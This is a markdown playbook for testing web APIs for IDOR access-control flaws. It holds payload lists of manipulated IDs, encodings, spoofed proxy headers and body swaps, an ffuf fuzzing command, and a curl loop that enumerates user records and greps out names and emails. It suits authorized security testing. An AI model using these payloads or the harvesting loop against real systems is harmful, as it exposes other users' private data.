# 🔐 IDOR Testing Playbook

A structured guide for identifying and exploiting **Insecure Direct Object Reference (IDOR)** vulnerabilities in web applications and APIs.

---

## 📌 What is IDOR?

IDOR occurs when an application exposes internal object references (like user IDs) without proper authorization checks, allowing attackers to access unauthorized data.

---

## 🧪 Testing Techniques

### 1. Sequential ID Manipulation

Test nearby IDs to check for unauthorized access.

```
/api/v5/users/10 => 200 OK (valid)
/api/v5/users/9  => 403/404 (target)
/api/v5/users/11 => 403/404
/api/v5/users/1  => 403/404 (admin?)
/api/v5/users/0
/api/v5/users/-1
/api/v5/users/999999
```

---

### 2. Trailing Slash / Path Normalization

Try bypassing controls using path variations.

```
/api/v5/users/9/
/api/v5/users/9//
/api/v5/users/9/./
/api/v5/users/9/../10/
```

---

### 3. Double / Obfuscated Slashes

```
/api/v5/users//9//
/api/v5/users/9///
/api/v5/users//9
```

---

### 4. Version Downgrade / Upgrade

Older or newer API versions may have weaker security.

```
/api/v2/users/9
/api/v1/users/9
/api/users/9
/v6/users/9
```

---

### 5. Subpath / Endpoint Variants

```
/api/v5/users/9/detail
/api/v5/users/9/profile
/api/v5/users/9/orders
/api/v5/user/9
/api/v5/u/9
```

---

### 6. Multi-ID / Parameter Abuse

```
/api/v5/users?id=10,9
/api/v5/users?id=9,10
/api/v5/users?ids[]=9
/api/v5/users?user_id=9
/api/v5/users?filter=9
```

---

### 7. Type Confusion / Format Switching

```
/api/v5/users/9abc
/api/v5/users/0009
/api/v5/users/09
/api/v5/users/9e0
/api/v5/users/true
/api/v5/users/0x9
```

---

### 8. Numeric Format Variations

```
/api/v5/users/0x9
/api/v5/users/0b1001
/api/v5/users/011
/api/v5/users/9.0
/api/v5/users/+9
/api/v5/users/%099
```

---

### 9. Null Byte / Termination

```
/api/v5/users/9%00
/api/v5/users/9\0
/api/v5/users/9%00admin
/api/v5/users/9%2500
```

---

### 10. Encoding Tricks

```
/api/v5/users/%209
/api/v5/users/9%20
/api/v5/users/%2e%2e%2f9
/api/v5/users/%u0039
/api/v5/users/&#57;
```

---

### 11. Header / Proxy Manipulation

```
GET /api/v5/users/9

X-Original-URL: /api/v5/users/10
X-Forwarded-For: 127.0.0.1
X-Original-User: 10
X-Rewrite-URL: /api/v5/users/10
Referer: /api/v5/users/10
```

---

### 12. Case Sensitivity

```
/api/v5/Users/9
/api/V5/users/9
/API/v5/USERS/9
```

---

### 13. Parameter Pollution (HPP)

```
/api/v5/users/9?user_id=10&user_id=9
/api/v5/users?user_id=9&user_id=10
```

---

### 14. JSON / XML Payload Swapping

```
POST /api/v5/users/9

{"id":10}
{"userId":9,"targetId":10}
<user id="10"/>
```

---

### 15. Mass Assignment / Related Endpoints

```
/api/v5/orders/9/user=10
/api/v5/files/9/owner=10
/api/v5/messages/9/to=10
/api/v5/audit/9/target=10
```

---

### 16. UUID / Hash Manipulation

```
123e4567-e89b-12d3-a456-426614174009
→ 123e4567-e89b-12d3-a456-426614174000

/api/v5/users/9-abc-123-def
/api/v5/projects/abc123/user=9
```

---

## ⚙️ Testing Methodology

### 🔍 Mapping

* Use Burp Suite (Scanner or manual)
* Identify all endpoints using IDs

---

### 💣 Fuzzing

```
ffuf -u "https://target/api/FUZZ/10" -w ids.txt -fs 403,404
```

---

### 📄 ID Lists

* Sequential IDs (1–1000)
* Usernames
* Emails (from recon)

---

### 🛠️ Tools

* Burp Suite (AuthMatrix, Param Miner)
* IDOR Scanner extensions
* idorber

---

### 🤖 Automation Script

```bash
for id in {1..1000}; do
  curl -s "https://target/api/users/$id" | jq . | grep -i "name\|email"
done
```

---

## 🎯 Common Targets

* `/user/{id}/profile`
* `/api/orders/{id}`
* `/download/{id}`
* `/share/{token}`
* `/admin/users/{id}`

---

## ⚠️ Notes

* Always test authorization, not just authentication.
* IDOR often exists in **hidden or secondary endpoints**.
* Combine multiple techniques for better results.

---

## 📢 Disclaimer

This guide is for **educational and authorized security testing purposes only**. Do not test systems without proper permission.

---

